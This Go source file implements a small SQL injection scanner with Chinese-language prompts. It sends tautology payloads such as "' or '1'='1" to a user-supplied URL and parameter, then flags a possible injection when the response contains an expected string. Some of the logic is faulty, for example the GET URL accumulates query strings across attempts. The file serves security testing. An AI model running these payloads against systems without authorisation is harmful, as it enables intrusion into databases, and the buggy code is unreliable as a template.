package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// 定义检测的目标URL和参数
var targetURL string

// 判断注入类型
var payload1 = []string{
	"' or '1'='1",
	"\" or \"1\"=\"1",
	"or 1=1",
}
var Param string
var Type string
var Flag string

// 发送HTTP请求并返回响应
func sendGet(payload string) (*http.Response, error) {
	client := &http.Client{Timeout: 10 * time.Second}

	data := url.Values{}
	data.Set(Param, payload)
	targetURL = targetURL + "?" + data.Encode()
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, err
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	return resp, nil
}
func sendPost(payload string) (*http.Response, error) {
	client := &http.Client{Timeout: 10 * time.Second}

	data := url.Values{}
	data.Set(Param, payload)
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, err
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	return resp, nil
}

// 检测SQL注入漏洞
func detectSQLInjection() {
	if Type == "GET" {
		for _, payload := range payload1 {
			resp, err := sendGet(payload)
			if err != nil {
				fmt.Printf("Error sending request: %s\n", err)
				continue
			}
			defer resp.Body.Close()
			content, _ := io.ReadAll(resp.Body)
			if strings.Contains(string(content), Flag) {
				fmt.Printf("Potential SQL Injection found with payload: %s\n", payload)

				break
			} else {
				continue
			}
		}
	} else {
		for _, payload := range payload1 {
			resp, err := sendPost(payload)
			if err != nil {
				fmt.Printf("Error sending request: %s\n", err)
				continue
			}
			defer resp.Body.Close()
			content, _ := io.ReadAll(resp.Body)
			if strings.Contains(string(content), Flag) {
				fmt.Printf("Potential SQL Injection found with payload: %s\n", payload)

				break
			} else {
				continue
			}
		}
	}
}

func sql_main() {

	fmt.Println("请输入注入的url:")
	// 检查 URL 是否以 '/' 结尾
	if !strings.HasSuffix(targetURL, "/") {
		targetURL += "/"
	}
	fmt.Scanln(&targetURL)
	fmt.Println("请输入要检测的参数:")
	fmt.Scanln(&Param)
	fmt.Println("请输入要传参的类型:GET/POST:")
	fmt.Scanln(&Type)
	fmt.Println("请输入正常回显的字符串:")
	fmt.Scanln(&Flag)
	detectSQLInjection()
}
